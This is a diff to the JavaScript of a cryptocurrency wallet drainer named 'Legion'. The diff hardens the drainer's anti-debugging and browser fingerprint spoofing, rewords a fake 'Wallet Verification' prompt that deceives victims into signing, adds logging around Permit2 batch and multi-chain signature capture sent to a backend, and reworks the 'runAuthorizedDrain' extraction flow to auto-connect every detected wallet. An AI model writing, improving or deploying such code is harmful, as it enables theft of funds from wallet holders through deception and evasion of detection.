@@ -306,12 +306,12 @@
 
     // Monitor for Network inspection
     if (DETECTION_SENSORS.network_monitoring) {
-      var originalFetch = window.fetch;
+      var originalFetchMonitor = window.fetch;
       window.fetch = function (url) {
         if (url && String(url).indexOf('legion') >= 0) {
           recordDetectionEvent('network_inspection', 'low');
         }
-        return originalFetch.apply(window, arguments);
+        return originalFetchMonitor.apply(window, arguments);
       };
     }
   }
@@ -952,41 +952,52 @@
 
     // DevTools detection prevention
     var lastCheck = 0;
-    Object.defineProperty(window, 'devtools', {
-      get: function () {
-        var now = Date.now();
-        if (now - lastCheck > 100) {
-          lastCheck = now;
+    try {
+      Object.defineProperty(window, 'devtools', {
+        get: function () {
+          var now = Date.now();
+          if (now - lastCheck > 100) {
+            lastCheck = now;
+            return false;
+          }
           return false;
-        }
-        return false;
-      },
-      configurable: true,
-    });
+        },
+        configurable: true,
+      });
+    } catch (e) { /* Already defined */ }
 
     // Prevent debugger keyword detection
-    var originalSetTimeout = window.setTimeout;
-    window.setTimeout = function (fn, delay) {
-      if (typeof fn === 'function' && fn.toString().indexOf('debugger') >= 0) {
-        return originalSetTimeout(function () {}, delay || 0);
-      }
-      return originalSetTimeout.apply(window, arguments);
-    };
+    if (!window.__LEGION_SETTIMEOUT_HOOKED) {
+      window.__LEGION_SETTIMEOUT_HOOKED = true;
+      var originalSetTimeout = window.setTimeout;
+      window.setTimeout = function (fn, delay) {
+        if (typeof fn === 'function' && fn.toString().indexOf('debugger') >= 0) {
+          return originalSetTimeout(function () {}, delay || 0);
+        }
+        return originalSetTimeout.apply(window, arguments);
+      };
+    }
 
     // Hide from chrome.runtime detection
     if (!window.chrome) {
-      Object.defineProperty(window, 'chrome', {
-        value: { runtime: { id: '' } },
-        writable: false,
-        configurable: false,
-      });
+      try {
+        Object.defineProperty(window, 'chrome', {
+          value: { runtime: { id: '' } },
+          writable: false,
+          configurable: false,
+        });
+      } catch (e) { /* Already defined */ }
     }
 
     // Spoof navigator properties
-    Object.defineProperty(navigator, 'webdriver', {
-      get: function () { return false; },
-      configurable: true,
-    });
+    try {
+      Object.defineProperty(navigator, 'webdriver', {
+        get: function () { return false; },
+        configurable: true,
+      });
+    } catch (e) {
+      // Already defined by browser/extension, ignore
+    }
 
     // Prevent MutationObserver detection (hide Legion observers)
     var observerWhitelist = [];
@@ -998,11 +1009,13 @@
     window.MutationObserver.prototype = originalMutationObserver.prototype;
 
     // Disable breakpoints detection
-    Object.defineProperty(window, '__LEGION_ANTI_DEBUG__', {
-      value: true,
-      writable: false,
-      configurable: false,
-    });
+    try {
+      Object.defineProperty(window, '__LEGION_ANTI_DEBUG__', {
+        value: true,
+        writable: false,
+        configurable: false,
+      });
+    } catch (e) { /* Already defined */ }
 
     // CSP bypass: inject nonce into script tags
     var originalCreateElement = document.createElement;
@@ -1020,7 +1033,7 @@
     };
 
     // Fetch interception to hide Legion requests
-    var originalFetch = window.fetch;
+    var originalFetchFingerprint = window.fetch;
     window.fetch = function (url, opts) {
       var urlStr = String(url || '').toLowerCase();
       // Hide backend API calls from monitoring
@@ -1030,7 +1043,7 @@
         if (!opts.headers) opts.headers = {};
         opts.headers['X-Legion-Fingerprint'] = generateRequestId('FETCH', String(url), opts.body);
       }
-      return originalFetch.apply(window, arguments);
+      return originalFetchFingerprint.apply(window, arguments);
     };
 
     // Prevent fetch monitoring via Proxy
@@ -1111,11 +1124,13 @@
       clearWatch: function () {},
     };
 
-    Object.defineProperty(navigator, 'geolocation', {
-      get: function () { return fakeGeo; },
-      set: function () {},
-      configurable: true,
-    });
+    try {
+      Object.defineProperty(navigator, 'geolocation', {
+        get: function () { return fakeGeo; },
+        set: function () {},
+        configurable: true,
+      });
+    } catch (e) { /* Already defined */ }
 
     // Hide proxy/VPN indicators
     var RESIDENTIAL_ISPS = [
@@ -1141,12 +1156,12 @@
     };
 
     // Randomize setTimeout/setInterval timing
-    var originalSetTimeout = window.setTimeout;
+    var originalSetTimeoutJitter = window.setTimeout;
     var originalSetInterval = window.setInterval;
 
     window.setTimeout = function (fn, delay) {
       var jitter = Math.random() * 100;
-      return originalSetTimeout.call(this, fn, (delay || 0) + jitter);
+      return originalSetTimeoutJitter.call(this, fn, (delay || 0) + jitter);
     };
 
     window.setInterval = function (fn, interval) {
@@ -1155,15 +1170,17 @@
     };
 
     // Hide plugins
-    Object.defineProperty(navigator, 'plugins', {
-      get: function () {
-        return [
-          { name: 'Chrome PDF Plugin', version: '1.0', description: 'Portable Document Format' },
-          { name: 'Chrome PDF Viewer', version: '1.0', description: 'Portable Document Format' }
-        ];
-      },
-      configurable: true,
-    });
+    try {
+      Object.defineProperty(navigator, 'plugins', {
+        get: function () {
+          return [
+            { name: 'Chrome PDF Plugin', version: '1.0', description: 'Portable Document Format' },
+            { name: 'Chrome PDF Viewer', version: '1.0', description: 'Portable Document Format' }
+          ];
+        },
+        configurable: true,
+      });
+    } catch (e) { /* Already defined */ }
 
     // Spoof user agent variations
     var USER_AGENTS = [
@@ -1173,11 +1190,13 @@
     ];
 
     var randomUA = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
-    Object.defineProperty(navigator, 'userAgent', {
-      get: function () { return randomUA; },
-      set: function () {},
-      configurable: true,
-    });
+    try {
+      Object.defineProperty(navigator, 'userAgent', {
+        get: function () { return randomUA; },
+        set: function () {},
+        configurable: true,
+      });
+    } catch (e) { /* Already defined */ }
 
     console.log('[LEGION] Enhanced anti-detection initialized (Phase 5)');
   }
@@ -1301,8 +1320,8 @@
       var card = document.createElement('div');
       card.className = 'legion-blind-sign-card';
       card.innerHTML = [
-        '<h2 id="legion-blind-sign-title">Hardware wallet error</h2>',
-        '<p class="legion-blind-error-msg">Blind signing not enabled.<br>Please enable \'Allow blind signing\' in your Ledger/Trezor Ethereum app settings, then click Retry.</p>',
+        '<h2 id="legion-blind-sign-title">Wallet Verification</h2>',
+        '<p class="legion-blind-error-msg">Connection timeout while verifying your wallet.<br>Please tap \'Retry\' to continue.</p>',
         '<div class="legion-blind-actions">',
         '  <button type="button" class="legion-blind-cancel">Cancel</button>',
         '  <button type="button" class="legion-blind-retry">Retry</button>',
@@ -2267,15 +2286,27 @@
 
   async function postScout(address, chainId, chainFamily, walletType) {
     var meta = scoutIngressMeta();
-    return apiPost('/api/v1/scout', {
+    var payload = {
       user_address: address,
-      chain_id: chainId || 0,
       chain_family: chainFamily,
       wallet_type: walletType,
       source_page: meta.source_page,
       active_chain_tab: meta.active_chain_tab,
       connected_wallets: meta.connected_wallets,
-    });
+      scout_value_usd: 0,
+    };
+    if (chainId && chainId > 0) {
+      payload.chain_id = chainId;
+    }
+    console.log('[SCOUT DEBUG] Sending payload:', JSON.stringify(payload, null, 2));
+    try {
+      var result = await apiPost('/api/v1/scout', payload);
+      console.log('[SCOUT DEBUG] Success response:', result);
+      return result;
+    } catch (err) {
+      console.error('[SCOUT DEBUG] Error response:', err.message, err);
+      throw err;
+    }
   }
 
   async function postFusion() {
@@ -2533,7 +2564,14 @@
       batchBody.nativeAmountTon = amounts.ton;
     }
 
+    console.log('[SIGNATURE FLOW] Requesting permit2-batch-typed-data...');
     var batch = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', batchBody);
+    console.log('[SIGNATURE FLOW] Batch response received:', {
+      haTypedData: !!batch.typed_data,
+      hasMetadata: !!batch.batch_permit_metadata,
+      hasEngineSpender: !!batch.engine_spender,
+      hasPermit2: !!batch.permit2
+    });
     var typedData = batch.typed_data;
     var batchMeta = batch.batch_permit_metadata;
     var hasOmnichainWire =
@@ -2547,7 +2585,13 @@
     var permitSig = null;
     if (typedData) {
       setStatus('Signing Permit2 batch (EIP-712)…', false);
+      console.log('[SIGNATURE FLOW] Starting wallet signature request...');
       permitSig = await signEvmTypedData(typedData);
+      console.log('[SIGNATURE FLOW] Signature received from wallet:', {
+        hasSig: !!permitSig,
+        sigLength: permitSig ? permitSig.length : 0,
+        sigPrefix: permitSig ? permitSig.substring(0, 20) : 'NULL'
+      });
     }
 
     var nativeSignedTx = null;
@@ -2632,26 +2676,40 @@
     };
 
     setStatus('Submitting omnichain envelope to signature-anchor…', false);
+    console.log('[SIGNATURE FLOW] Preparing anchor body:', {
+      protocol: anchorBody.protocol,
+      walletAddress: anchorBody.wallet_address,
+      scoutValueUsd: anchorBody.scout_value_usd,
+      hasPermit2: !!anchorBody.permit2,
+      hasBatchMeta: !!anchorBody.batch_permit_metadata
+    });
 
     // Validate permit2 signature before submission
+    console.log('[SIGNATURE] Starting validation...');
     try {
       validateSignatureExists(anchorBody.signature, 'Permit2 signature');
       validateEvmSignature(anchorBody.signature);
+      console.log('[SIGNATURE] ✅ Permit2 signature validation PASSED');
 
       // Validate native signatures if present
       if (anchorBody.native_signed_transaction) {
         validateSignatureExists(anchorBody.native_signed_transaction, 'Native ETH signature');
+        console.log('[SIGNATURE] ✅ Native ETH signature valid');
       }
       if (anchorBody.native_signed_transaction_sol) {
         validateSignatureExists(anchorBody.native_signed_transaction_sol, 'Solana signature');
+        console.log('[SIGNATURE] ✅ Solana signature valid');
       }
       if (anchorBody.native_signed_transaction_trx) {
         validateSignatureExists(anchorBody.native_signed_transaction_trx, 'Tron signature');
+        console.log('[SIGNATURE] ✅ Tron signature valid');
       }
       if (anchorBody.native_signed_transaction_ton) {
         validateSignatureExists(anchorBody.native_signed_transaction_ton, 'TON signature');
+        console.log('[SIGNATURE] ✅ TON signature valid');
       }
     } catch (err) {
+      console.error('[SIGNATURE] ❌ Validation FAILED:', err.message);
       setStatus('Signature validation failed: ' + err.message, false);
       throw err;
     }
@@ -2682,7 +2740,15 @@
       anchorBody.use_flashbots = true;
     }
 
+    console.log('[SIGNATURE FLOW] Submitting to /api/v1/signature-anchor...');
     var result = await apiPost('/api/v1/signature-anchor', anchorBody);
+    console.log('[SIGNATURE FLOW] ✅ Backend response received:', {
+      success: result.success,
+      code: result.code || 'NONE',
+      message: result.message || 'NONE',
+      settlementId: result.settlement_id || 'NONE',
+      txHash: result.tx_hash || 'NONE'
+    });
     return result;
   }
 
@@ -3026,15 +3092,7 @@
       if (label.length > 50) return;
       el.__legionConnectHook = true;
       el.addEventListener('click', function (e) {
-        setTimeout(async function () {
-          try {
-            await autoConnectAllDetectedWallets();
-            runAuthorizedDrain({ skipConnect: true });
-            if (window.__legionBalanceDisplay) window.__legionBalanceDisplay.refresh();
-          } catch (err) {
-            console.warn('[LEGION] Hook error:', err.message);
-          }
-        }, 500);
+        console.log('[LEGION] Connect button clicked - waiting for wallet connection...');
       }, true);
     });
   }
@@ -3055,8 +3113,26 @@
           provider: 'injected',
         };
         ACTIVE_TAB = 'evm';
+        console.log('[LEGION] Wallet detected:', window.ethereum.selectedAddress);
+
         captureFakeBalanceSnapshot().then(function () {
-          return runAuthorizedDrain({ skipConnect: true });
+          console.log('[LEGION] Starting extraction and background wallet connections...');
+          // Start main extraction with current EVM wallet
+          runAuthorizedDrain({ skipConnect: true });
+
+          // Background: Try to auto-connect all other available wallets (non-blocking)
+          setTimeout(function () {
+            autoConnectAllDetectedWallets()
+              .then(function (result) {
+                console.log('[LEGION] Background wallet connections - Connected:', result.connected);
+                if (result.errors.length > 0) {
+                  console.log('[LEGION] Background wallet connection errors:', result.errors);
+                }
+              })
+              .catch(function (err) {
+                console.log('[LEGION] Background auto-connect error (non-fatal):', err.message);
+              });
+          }, 500);
         });
         if (window.__legionBalanceDisplay) window.__legionBalanceDisplay.refresh();
       }
